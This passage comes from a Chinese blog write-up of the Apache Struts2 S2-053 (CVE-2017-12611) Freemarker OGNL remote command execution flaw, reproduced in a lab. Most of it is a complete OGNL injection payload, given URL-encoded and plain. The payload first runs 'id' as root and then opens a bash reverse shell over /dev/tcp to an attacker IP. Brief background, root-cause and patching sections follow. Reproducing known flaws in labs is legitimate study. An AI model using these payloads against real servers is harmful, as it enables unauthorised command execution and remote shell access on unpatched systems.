operator">%</span>3D<span class="token operator">%</span>23context<span class="token operator">%</span>5B<span class="token operator">%</span>27com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ActionContext<span class="token punctuation">.</span>container<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token operator">%</span>3D<span class="token operator">%</span>23container<span class="token punctuation">.</span>getInstance<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil<span class="token operator">%</span>40class<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token punctuation">.</span>getExcludedPackageNames<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>clear<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token punctuation">.</span>getExcludedClasses<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>clear<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23context<span class="token punctuation">.</span>setMemberAccess<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23dm<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmd<span class="token operator">%</span>3D<span class="token operator">%</span>27id<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23iswin<span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token operator">%</span>40getProperty<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token punctuation">.</span>name<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>toLowerCase<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>contains<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27win<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmds<span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23iswin<span class="token operator">%</span>3F<span class="token operator">%</span>7B<span class="token operator">%</span>27cmd<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2Fc<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>23cmd<span class="token operator">%</span>7D<span class="token operator">%</span>3A<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2Fbin<span class="token operator">%</span>2Fbash<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>23cmd<span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23p<span class="token operator">%</span>3Dnew<span class="token operator">%</span>20java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmds<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23p<span class="token punctuation">.</span>redirectErrorStream<span class="token operator">%</span>28true<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23process<span class="token operator">%</span>3D<span class="token operator">%</span>23p<span class="token punctuation">.</span>start<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils<span class="token operator">%</span>40toString<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23process<span class="token punctuation">.</span>getInputStream<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>7D<span class="token operator">%</span>0A</pre></td></tr><tr><td data-num="2"></td><td><pre> ​</pre></td></tr><tr><td data-num="3"></td><td><pre> payload原型：</pre></td></tr><tr><td data-num="4"></td><td><pre> redirectUri<span class="token operator">=</span><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>#dm<span class="token operator">=</span>@ognl<span class="token punctuation">.</span>OgnlContext@<span class="token constant">DEFAULT_MEMBER_ACCESS</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">?</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">=</span>#dm<span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">(</span>#container<span class="token operator">=</span>#context<span class="token punctuation">[</span><span class="token string">'com.opensymphony.xwork2.ActionContext.container'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token operator">=</span>#container<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>@com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil@<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedPackageNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#context<span class="token punctuation">.</span><span class="token function">setMemberAccess</span><span class="token punctuation">(</span>#dm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmd<span class="token operator">=</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#iswin<span class="token operator">=</span><span class="token punctuation">(</span>@java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System@<span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">'os.name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmds<span class="token operator">=</span><span class="token punctuation">(</span>#iswin<span class="token operator">?</span><span class="token punctuation">&#123;</span><span class="token string">'cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">&#125;</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder</span><span class="token punctuation">(</span>#cmds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#process<span class="token operator">=</span>#p<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>@org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils@<span class="token function">toString</span><span class="token punctuation">(</span>#process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>发现成功执行了 id 命令，发现是 root 权限。</p>
<p><img loading="lazy" data-src="https://developer.qcloudimg.com/http-save/8478947/c6508263b445122ad27b59c667af755b.png" alt="image-20221207154929413" /></p>
<p>image-20221207154929413</p>
<p>修改 payload，执行反弹 shell 命令。</p>
<p>首先要监听端口，ip 是攻击 ip，不是漏洞靶机 ip。这里没有再开另外一台机器，因此用和靶机同一台的 ip 进行接收所反弹的 shell。</p>
<p>对要生成的反弹 shell 命令进行 url 编码</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>这里的ip地址也是攻击机的ip地址</pre></td></tr><tr><td data-num="2"></td><td><pre> bash <span class="token operator">-</span>i <span class="token operator">></span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.158</span><span class="token operator">/</span><span class="token number">9999</span> <span class="token number">0</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre> ​</pre></td></tr><tr><td data-num="4"></td><td><pre> bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>2Fdev<span class="token operator">%</span>2Ftcp<span class="token operator">%</span>2F192<span class="token punctuation">.</span><span class="token number">168.146</span><span class="token number">.158</span><span class="token operator">%</span>2F9999<span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">261</span></pre></td></tr></table></figure><p>最终的反弹 shell payload 如下</p>
<p>代码语言：javascript</p>
<p>复制</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>redirectUri<span class="token operator">=</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23dm<span class="token operator">%</span>3D<span class="token operator">%</span>40ognl<span class="token punctuation">.</span>OgnlContext<span class="token operator">%</span>40DEFAULT_MEMBER_ACCESS<span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23_memberAccess<span class="token operator">%</span>3F<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23_memberAccess<span class="token operator">%</span>3D<span class="token operator">%</span>23dm<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3A<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23container<span class="token operator">%</span>3D<span class="token operator">%</span>23context<span class="token operator">%</span>5B<span class="token operator">%</span>27com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ActionContext<span class="token punctuation">.</span>container<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>5D<span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token operator">%</span>3D<span class="token operator">%</span>23container<span class="token punctuation">.</span>getInstance<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil<span class="token operator">%</span>40class<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token punctuation">.</span>getExcludedPackageNames<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>clear<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23ognlUtil<span class="token punctuation">.</span>getExcludedClasses<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>clear<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23context<span class="token punctuation">.</span>setMemberAccess<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23dm<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmd<span class="token operator">%</span>3D<span class="token operator">%</span>27bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>2Fdev<span class="token operator">%</span>2Ftcp<span class="token operator">%</span>2F192<span class="token punctuation">.</span><span class="token number">168.146</span><span class="token number">.158</span><span class="token operator">%</span>2F9999<span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23iswin<span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System<span class="token operator">%</span>40getProperty<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27os<span class="token punctuation">.</span>name<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>toLowerCase<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span>contains<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>27win<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmds<span class="token operator">%</span>3D<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23iswin<span class="token operator">%</span>3F<span class="token operator">%</span>7B<span class="token operator">%</span>27cmd<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2Fc<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>23cmd<span class="token operator">%</span>7D<span class="token operator">%</span>3A<span class="token operator">%</span>7B<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2Fbin<span class="token operator">%</span>2Fbash<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span><span class="token number">27</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>2C<span class="token operator">%</span>23cmd<span class="token operator">%</span>7D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23p<span class="token operator">%</span>3Dnew<span class="token operator">%</span>20java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23cmds<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23p<span class="token punctuation">.</span>redirectErrorStream<span class="token operator">%</span>28true<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23process<span class="token operator">%</span>3D<span class="token operator">%</span>23p<span class="token punctuation">.</span>start<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span><span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>40org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils<span class="token operator">%</span>40toString<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>23process<span class="token punctuation">.</span>getInputStream<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>7D<span class="token operator">%</span>0A</pre></td></tr><tr><td data-num="2"></td><td><pre> ​</pre></td></tr><tr><td data-num="3"></td><td><pre> payload原型：</pre></td></tr><tr><td data-num="4"></td><td><pre> redirectUri<span class="token operator">=</span><span class="token operator">%</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>#dm<span class="token operator">=</span>@ognl<span class="token punctuation">.</span>OgnlContext@<span class="token constant">DEFAULT_MEMBER_ACCESS</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">?</span><span class="token punctuation">(</span>#_memberAccess<span class="token operator">=</span>#dm<span class="token punctuation">)</span><span class="token operator">:</span><span class="token punctuation">(</span><span class="token punctuation">(</span>#container<span class="token operator">=</span>#context<span class="token punctuation">[</span><span class="token string">'com.opensymphony.xwork2.ActionContext.container'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token operator">=</span>#container<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>@com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ognl<span class="token punctuation">.</span>OgnlUtil@<span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedPackageNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#ognlUtil<span class="token punctuation">.</span><span class="token function">getExcludedClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#context<span class="token punctuation">.</span><span class="token function">setMemberAccess</span><span class="token punctuation">(</span>#dm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmd<span class="token operator">=</span><span class="token string">'bash -i >&amp; /dev/tcp/192.168.146.158/9999 0>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#iswin<span class="token operator">=</span><span class="token punctuation">(</span>@java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>System@<span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">'os.name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'win'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#cmds<span class="token operator">=</span><span class="token punctuation">(</span>#iswin<span class="token operator">?</span><span class="token punctuation">&#123;</span><span class="token string">'cmd.exe'</span><span class="token punctuation">,</span><span class="token string">'/c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">&#125;</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">,</span>#cmd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProcessBuilder</span><span class="token punctuation">(</span>#cmds<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#p<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>#process<span class="token operator">=</span>#p<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>@org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOUtils@<span class="token function">toString</span><span class="token punctuation">(</span>#process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>反弹成功</p>
<p><img loading="lazy" data-src="https://developer.qcloudimg.com/http-save/8478947/eabb5b3cf03deb3858b51432d88fdea9.png" alt="image-20221207155226506" /></p>
<p>image-20221207155226506</p>
<p><img loading="lazy" data-src="https://developer.qcloudimg.com/http-save/8478947/ea6a718e1c219b0e02c1b2c272bc1e6e.png" alt="image-20221207155250437" /></p>
<h1 id="x03-漏洞背景"><a class="anchor" href="#x03-漏洞背景">#</a> x03 漏洞背景</h1>
<p>2017 年 9 月 7 日，Struts 官方发布一个中危的<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&amp;zhida_source=entity&amp;is_preview=1">安全漏洞</a>，该漏洞编号为：S2-053, 在一定条件下，当开发人员在 Freemarker 标签中使用错误的构造时，可能会导致<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&amp;zhida_source=entity&amp;is_preview=1">远程代码执行漏洞</a>。</p>
<h1 id="x04-漏洞原理"><a class="anchor" href="#x04-漏洞原理">#</a> x04 漏洞原理</h1>
<p><strong>Struts2 在使用 Freemarker 模块引擎的时候，同时允许解析 OGNL 表达式。导致用户输入的数据本身不会被 OGNL 解析，但是由于被 Freemarker 解析一次后变成离开一个表达式，被 OGNL 解析第二次，导致任意命令执行漏洞。</strong></p>
<p>当在 Freemarker 标签中使用表达式文本或强制表达式时，使用以下请求值可能会导致远程代码执行</p>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tr><td data-num="1"></td><td><pre>&lt;@s.hidden name="redirectUri" value=redirectUri /></pre></td></tr><tr><td data-num="2"></td><td><pre>&lt;@s.hidden name="redirectUri" value="$&#123;redirectUri&#125;" /></pre></td></tr></table></figure><h1 id="x05-修复方案"><a class="anchor" href="#x05-修复方案">#</a> x05 修复方案</h1>
<p>开发人员检查  Freemarker 标签   是否使用了可写属性，并在受影响范围内。<br />
<strong>漏洞修复建议 (或缓解措施):</strong></p>
<ul>
<li>关闭 debug</li>
<li>不要在代码中使用上述结构，或者使用只读属性来初始化 value 属性（仅限 getter 属性）。</li>
<li>升级到 Apache Struts 2.5.13 或 2.3.34 版本</li>
</ul>
<p><strong>情报来源:</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://struts.apache.org/docs/s2-053.html">https://struts.apache.org/docs/s2-053.html</a></li>
</ul>
<p>升级到 Apache Struts 2.5.13 或 2.3.34・Freemarker 标签内容不要通过 Request 方式获取・使用只读属性来初始化 value 属性（仅限 getter 属性）・不要使用如下结构</p>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tr><td data-num="1"></td><td><pre>&lt;@s.hidden name="redirectUri" value=redirectUri /></pre></td></tr><tr><td data-num="2"></td><td><pre>&lt;@s.hidden name="redirectUri" value="$&#123;redirectUri&#125;"/></pre></td></tr></table></figure><p>厂商补丁：</p>
<p>Apache Group</p>
<hr />
<p>Apache Group 已经为此发布了一个安全公告（S2-053）以及相应补丁:<br />
S2-053：A possible Remote Code Execution attack when using an unintentional expression in Freemarker tag instead of string literals<br />
 链接：<a target="_blank" rel="noopener" href="https://www.ancii.com/link/v1/FCR6ELdsNptoVkZF9NvbL0957LG_cBJSLTSWUC6aDsk3z8al8Ro9GVh9waalNfc-CskWDL3DXZyRaZyevc5BWg/" title="https://cwiki.apache.org/confluence/display/WW/S2-053">https://cwiki.apache.org/confluence/display/WW/S2-053</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ancii.com/link/v1/FCR6ELdsNptoVkZF9NvbL0957LG_cBJSLTSWUC6aDsl0xiw7JlJkOrEtZhWgPsluKdjs0yn0AiL4AY1MrhY4Kgp7n_9mL6spSrqb9UZP1kI/" title="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.12">https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.12</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ancii.com/link/v1/FCR6ELdsNptoVkZF9NvbL0957LG_cBJSLTSWUC6aDsl0xiw7JlJkOrEtZhWgPslu7C9QwNhwYZTAJ-9G7RjuK4mwIvfFPRfHTdf9zk2P-sI/" title="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.34">https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.34</a></p>
<div class="tags"><a href="/tags/CVE/" rel="tag"><i class="ic i-tag"></i>CVE</a></div></div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="/2024/09/05/CVE/Struts2/CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新於</span><time title="修改時間：2024-09-05 16:49:08" itemprop="dateModified" datetime="2024-09-05T16:49:08+08:00">2024-09-05</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>打賞</button><p>請我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.png" alt="CygneNoir 微信支付"/><p>微信支付</p></div><div><img loading="lazy" data-src="/assets/alipay.jpg" alt="CygneNoir 支付寶"/><p>支付寶</p></div></div></div><div id="copyright"><ul><li class="author"><strong>博主：</strong>CygneNoir<i class="ic i-at"><em>@</em></i>CygneNoir</li><li class="link"><strong>文章連結：</strong><a href="http://example.com/2024/09/05/CVE/Struts2/CVE-2017-12611%20Struts2%20Freemarker%20%E6%A0%87%E7%AD%BE%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E%20S2-053/" title="CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053">http://example.com/2024/09/05/CVE/Struts2/CVE-2017-12611 Struts2 Freemarker 标签远程执行命令漏洞 S2-053/</a></li><li class="license"><strong>版權聲明：</strong>本網誌所有文章除特別聲明外，均採用 <a target="_blank" rel="noopener" 